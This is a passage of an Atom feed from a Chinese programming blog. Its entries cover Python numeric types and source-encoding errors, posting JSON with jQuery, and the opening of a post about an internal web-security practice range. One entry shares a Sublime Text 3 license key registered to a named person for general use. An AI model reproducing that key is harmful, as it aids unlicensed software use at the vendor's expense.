&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;a=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;; &lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt;(a); a=&lt;span class=&quot;number&quot;&gt;3.4&lt;/span&gt;; &lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt;(a);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;int&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;float&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;4-浮点数与整数运算结果是浮点数。&quot;&gt;&lt;a href=&quot;#4-浮点数与整数运算结果是浮点数。&quot; class=&quot;headerlink&quot; title=&quot;4. 浮点数与整数运算结果是浮点数。&quot;&gt;&lt;/a&gt;4. 浮点数与整数运算结果是浮点数。&lt;/h3&gt;&lt;h3 id=&quot;5-运算溢出问题&quot;&gt;&lt;a href=&quot;#5-运算溢出问题&quot; class=&quot;headerlink&quot; title=&quot;5. 运算溢出问题&quot;&gt;&lt;/a&gt;5. 运算溢出问题&lt;/h3&gt;&lt;p&gt;整数间运算不会出现整数溢出问题，但是如果与浮点数一起计算就有可能出现溢出问题。&lt;/p&gt;
&lt;p&gt;参见：&lt;a href=&quot;https://github.com/yeshaoting/StarterLearningPython/blob/master/102.md&quot;&gt;https://github.com/yeshaoting/StarterLearningPython/blob/master/102.md&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="系统脚本" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="python" scheme="http://yeshaoting.cn/tags/python/"/>
    
    <category term="学习笔记" scheme="http://yeshaoting.cn/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>python打印中文异常</title>
    <link href="http://yeshaoting.cn/article/python/python%E6%89%93%E5%8D%B0%E4%B8%AD%E6%96%87%E5%BC%82%E5%B8%B8/"/>
    <id>http://yeshaoting.cn/article/python/python%E6%89%93%E5%8D%B0%E4%B8%AD%E6%96%87%E5%BC%82%E5%B8%B8/</id>
    <published>2016-05-01T11:46:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/python.png" class="img-logo img-center" /><h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>脚本里需要打印中文内容。</p><h2 id="二、脚本"><a href="#二、脚本" class="headerlink" title="二、脚本"></a>二、脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on Apr 27, 2016</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: yeshaoting</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;你好，python!&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="三、问题"><a href="#三、问题" class="headerlink" title="三、问题"></a>三、问题</h2><p>python脚本里包含有中文时，报如下错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/Applications/STS.app/Contents/Eclipse/plugins/org.python.pydev_4.5.5.201603221110/pysrc/pydevd.py&quot;</span>, line 1529, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    globals = debugger.run(setup[<span class="string">&#x27;file&#x27;</span>], None, None, is_module)</span><br><span class="line">  File <span class="string">&quot;/Applications/STS.app/Contents/Eclipse/plugins/org.python.pydev_4.5.5.201603221110/pysrc/pydevd.py&quot;</span>, line 936, <span class="keyword">in</span> run</span><br><span class="line">    pydev_imports.execfile(file, globals, locals)  <span class="comment"># execute the script</span></span><br><span class="line">  File <span class="string">&quot;/Users/yeshaoting/java/workspace/python-workspace/HelloPython/base/HelloWorld.py&quot;</span>, line 8</span><br><span class="line">SyntaxError: Non-ASCII character <span class="string">&#x27;\xe4&#x27;</span> <span class="keyword">in</span> file /Users/yeshaoting/java/workspace/python-workspace/HelloPython/base/HelloWorld.py on line 8, but no encoding declared; see http://python.org/dev/peps/pep-0263/ <span class="keyword">for</span> details</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="四、解决方法"><a href="#四、解决方法" class="headerlink" title="四、解决方法"></a>四、解决方法</h2><p>告诉python解释器，按照utf-8编码读取源代码。</p><p>具体做法：在python脚本开头添加如下内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br></pre></td></tr></table></figure><p><strong>注</strong>：此内容必须放在脚本shebang后一行(不允许隔空行)或者放在脚本第一行。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;你好，世界&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="六、参考文档"><a href="#六、参考文档" class="headerlink" title="六、参考文档"></a>六、参考文档</h2><p><a href="http://www.runoob.com/python/python-chinese-encoding.html">Python 中文编码</a><br><a href="http://in355hz.iteye.com/blog/1860787">也谈 Python 的中文编码处理</a></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/python.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、背景&quot;&gt;&lt;a href=&quot;#一、背景&quot; class=&quot;headerlink&quot; title=&quot;一、背景&quot;&gt;&lt;/a&gt;一、背景&lt;/h2&gt;&lt;p&gt;脚本里需要打印中文内容。&lt;/p&gt;
&lt;h2 id=&quot;二、脚本&quot;&gt;&lt;a href=&quot;#二、脚本&quot; class=&quot;headerlink&quot; title=&quot;二、脚本&quot;&gt;&lt;/a&gt;二、脚本&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;Created on Apr 27, 2016&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;@author: yeshaoting&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; __name__ == &lt;span class=&quot;string&quot;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;你好，python!&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;h2 id=&quot;三、问题&quot;&gt;&lt;a href=&quot;#三、问题&quot; class=&quot;headerlink&quot; title=&quot;三、问题&quot;&gt;&lt;/a&gt;三、问题&lt;/h2&gt;&lt;p&gt;python脚本里包含有中文时，报如下错误：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Traceback (most recent call last):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  File &lt;span class=&quot;string&quot;&gt;&amp;quot;/Applications/STS.app/Contents/Eclipse/plugins/org.python.pydev_4.5.5.201603221110/pysrc/pydevd.py&amp;quot;&lt;/span&gt;, line 1529, &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    globals = debugger.run(setup[&lt;span class=&quot;string&quot;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;], None, None, is_module)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  File &lt;span class=&quot;string&quot;&gt;&amp;quot;/Applications/STS.app/Contents/Eclipse/plugins/org.python.pydev_4.5.5.201603221110/pysrc/pydevd.py&amp;quot;&lt;/span&gt;, line 936, &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; run&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    pydev_imports.execfile(file, globals, locals)  &lt;span class=&quot;comment&quot;&gt;# execute the script&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  File &lt;span class=&quot;string&quot;&gt;&amp;quot;/Users/yeshaoting/java/workspace/python-workspace/HelloPython/base/HelloWorld.py&amp;quot;&lt;/span&gt;, line 8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SyntaxError: Non-ASCII character &lt;span class=&quot;string&quot;&gt;&amp;#x27;\xe4&amp;#x27;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; file /Users/yeshaoting/java/workspace/python-workspace/HelloPython/base/HelloWorld.py on line 8, but no encoding declared; see http://python.org/dev/peps/pep-0263/ &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; details&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="系统脚本" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="python" scheme="http://yeshaoting.cn/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Sublime Text 3序列号</title>
    <link href="http://yeshaoting.cn/article/tool/Sublime%20Text%203%E5%BA%8F%E5%88%97%E5%8F%B7/"/>
    <id>http://yeshaoting.cn/article/tool/Sublime%20Text%203%E5%BA%8F%E5%88%97%E5%8F%B7/</id>
    <published>2016-04-11T13:29:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>分享Sublime Text 3序列号一枚：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">—– BEGIN LICENSE —–</span><br><span class="line">Andrew Weber</span><br><span class="line">Single User License</span><br><span class="line">EA7E-855605</span><br><span class="line">813A03DD 5E4AD9E6 6C0EEB94 BC99798F</span><br><span class="line">942194A6 02396E98 E62C9979 4BB979FE</span><br><span class="line">91424C9D A45400BF F6747D88 2FB88078</span><br><span class="line">90F5CC94 1CDC92DC 8457107A F151657B</span><br><span class="line">1D22E383 A997F016 42397640 33F41CFC</span><br><span class="line">E1D0AE85 A0BBD039 0E9C8D55 E1B89D5D</span><br><span class="line">5CDB7036 E56DE1C0 EFCC0840 650CD3A6</span><br><span class="line">B98FC99C 8FAC73EE D2B95564 DF450523</span><br><span class="line">—— END LICENSE ——</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;分享Sublime Text 3序列号一枚：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cl</summary>
      
    
    
    
    <category term="工具软件" scheme="http://yeshaoting.cn/categories/%E5%B7%A5%E5%85%B7%E8%BD%AF%E4%BB%B6/"/>
    
    
    <category term="sublime" scheme="http://yeshaoting.cn/tags/sublime/"/>
    
    <category term="序列号" scheme="http://yeshaoting.cn/tags/%E5%BA%8F%E5%88%97%E5%8F%B7/"/>
    
  </entry>
  
  <entry>
    <title>jquery如何传输json数据</title>
    <link href="http://yeshaoting.cn/article/js/jquery%E5%A6%82%E4%BD%95%E4%BC%A0%E8%BE%93json%E6%95%B0%E6%8D%AE/"/>
    <id>http://yeshaoting.cn/article/js/jquery%E5%A6%82%E4%BD%95%E4%BC%A0%E8%BE%93json%E6%95%B0%E6%8D%AE/</id>
    <published>2016-04-10T12:19:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/jquery.png" class="img-logo img-center" /><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>本文阐述基于如下mock接口：<br>接口：<a href="http://openapi.tencentyun.com/v3/user/delete">http://openapi.tencentyun.com/v3/user/delete</a></p><table><thead><tr><th>参数</th><th>参数说明</th></tr></thead><tbody><tr><td>appid</td><td>应用ID</td></tr><tr><td>appkey</td><td>应用密钥</td></tr><tr><td>userid</td><td>用户ID</td></tr><tr><td>operid</td><td>操作者ID</td></tr></tbody></table><h2 id="二、请求删除用户"><a href="#二、请求删除用户" class="headerlink" title="二、请求删除用户"></a>二、请求删除用户</h2><h3 id="1-构造请求参数"><a href="#1-构造请求参数" class="headerlink" title="1. 构造请求参数"></a>1. 构造请求参数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = &#123;</span><br><span class="line">    <span class="string">&quot;appid&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;appkey&quot;</span>: <span class="string">&quot;5F154D7D2751AEDC8527269006F290F70297B7E54667536C&quot;</span>,</span><br><span class="line">    <span class="string">&quot;userid&quot;</span>: <span class="string">&quot;B624064BA065E01CB73F835017FE96FA&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operid&quot;</span>: <span class="string">&quot;B624064BA065E01CB73F835017FE96FA&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="2-构造请求"><a href="#2-构造请求" class="headerlink" title="2. 构造请求"></a>2. 构造请求</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;http://openapi.tencentyun.com/v3/user/delete&quot;</span>;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="attr">url</span>: url,</span><br><span class="line">    <span class="attr">async</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">processData</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">data</span>: <span class="built_in">JSON</span>.stringify(params),</span><br><span class="line">    <span class="attr">contentType</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="attr">dataType</span>: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params">json</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="3-需要注意几个地方"><a href="#3-需要注意几个地方" class="headerlink" title="3. 需要注意几个地方"></a>3. 需要注意几个地方</h3><ul><li>contentType设置为：application/json</li><li>dataType设置为：json</li><li>data必须是字符串，而不是一个js对象</li></ul><h3 id="4-json对象转字符串"><a href="#4-json对象转字符串" class="headerlink" title="4. json对象转字符串"></a>4. json对象转字符串</h3><ul><li>可以对于js自带的JSON.stringify(params)转成字符串</li><li>使用jquery的$.param()方法将json对象序列化成键值对</li></ul><h2 id="三、参考文档"><a href="#三、参考文档" class="headerlink" title="三、参考文档"></a>三、参考文档</h2><p><a href="http://stackoverflow.com/questions/6255344/how-can-i-use-jquery-to-post-json-data/6255394#6255394">How can I use JQuery to post JSON data?</a></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/jquery.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;本文阐述基于如下mock接口：&lt;br&gt;接口：&lt;a href=&quot;http://openapi.tencentyun.com/v3/user/delete&quot;&gt;http://openapi.tencentyun.com/v3/user/delete&lt;/a&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;参数说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;appid&lt;/td&gt;
&lt;td&gt;应用ID&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;appkey&lt;/td&gt;
&lt;td&gt;应用密钥&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;userid&lt;/td&gt;
&lt;td&gt;用户ID&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;operid&lt;/td&gt;
&lt;td&gt;操作者ID&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id=&quot;二、请求删除用户&quot;&gt;&lt;a href=&quot;#二、请求删除用户&quot; class=&quot;headerlink&quot; title=&quot;二、请求删除用户&quot;&gt;&lt;/a&gt;二、请求删除用户&lt;/h2&gt;&lt;h3 id=&quot;1-构造请求参数&quot;&gt;&lt;a href=&quot;#1-构造请求参数&quot; class=&quot;headerlink&quot; title=&quot;1. 构造请求参数&quot;&gt;&lt;/a&gt;1. 构造请求参数&lt;/h3&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; params = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&amp;quot;appid&amp;quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&amp;quot;appkey&amp;quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&amp;quot;5F154D7D2751AEDC8527269006F290F70297B7E54667536C&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&amp;quot;userid&amp;quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&amp;quot;B624064BA065E01CB73F835017FE96FA&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&amp;quot;operid&amp;quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&amp;quot;B624064BA065E01CB73F835017FE96FA&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="前端设计" scheme="http://yeshaoting.cn/categories/%E5%89%8D%E7%AB%AF%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="jquery" scheme="http://yeshaoting.cn/tags/jquery/"/>
    
  </entry>
  
  <entry>
    <title>WEB安全渗透分享</title>
    <link href="http://yeshaoting.cn/article/security/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/"/>
    <id>http://yeshaoting.cn/article/security/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/</id>
    <published>2016-03-15T10:08:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/hack.png" class="img-logo img-center" /><p>WEB安全渗透靶场：<a href="http://10.4.236.115:8080/">http://10.4.236.115:8080/</a><br>是否开放所有关卡切换：<a href="http://10.4.236.115:8080/sohu/switchOpenStage">http://10.4.236.115:8080/sohu/switchOpenStage</a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>此次分享内容旨在加深开发工作中的安全意识，也希望能起到抛砖引玉的作用，在分享完成后的讨论环节大家也说说自己现在或者曾经遇到过的安全问题。</p><p>为了让大家能参与其中，对WEB安全问题有个更具象的认识。周末二天基于 <code>angularjs</code>、<code>jquery</code>、<code>spring</code>、<code>spring mvc</code>、<code>mybatis</code>、<code>mysql</code> 搭建一个比较粗糙的WEB安全靶场，复刻自参加的第一屇搜狐安全擂台赛，供大家hack。<br>如发现问题，请各位见谅哈。</p><h3 id="1-用户登记"><a href="#1-用户登记" class="headerlink" title="1. 用户登记"></a>1. 用户登记</h3><p>主要是为了收集用户名信息，进行登记，用于记录闯关进度!</p><p>界面如下图所示：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_1.png" alt="用户登记"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_1.png" alt="用户登记"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_1.png" alt="用户登记"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_1.png" alt="用户登记"></p><h3 id="2-用户主页"><a href="#2-用户主页" class="headerlink" title="2. 用户主页"></a>2. 用户主页</h3><p>简单地展示用户当前进度，并提供进入下一关的入口。后续可以扩展，显示击败百分之多少的对手。</p><p>界面如下图所示：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_3.png" alt="用户主页"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_3.png" alt="用户主页"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_3.png" alt="用户主页"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_3.png" alt="用户主页"></p><span id="more"></span><h2 id="0x01-关卡1"><a href="#0x01-关卡1" class="headerlink" title="0x01 关卡1"></a>0x01 关卡1</h2><p>属于热身题，纯属练手，引导用户在之后的关卡中找到更多破解信息。</p><h3 id="1-提示"><a href="#1-提示" class="headerlink" title="1. 提示"></a>1. 提示</h3><p>提示如下：</p><blockquote><p>任务目标：找出正确的用户名与密码并通过验证。<br>Tips：这个页面用户与密码不需要去服务器交互验证。</p></blockquote><h3 id="2-界面"><a href="#2-界面" class="headerlink" title="2. 界面"></a>2. 界面</h3><p>界面如下图所示：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_4.png" alt="关卡1"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_4.png" alt="关卡1"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_4.png" alt="关卡1"><br><img 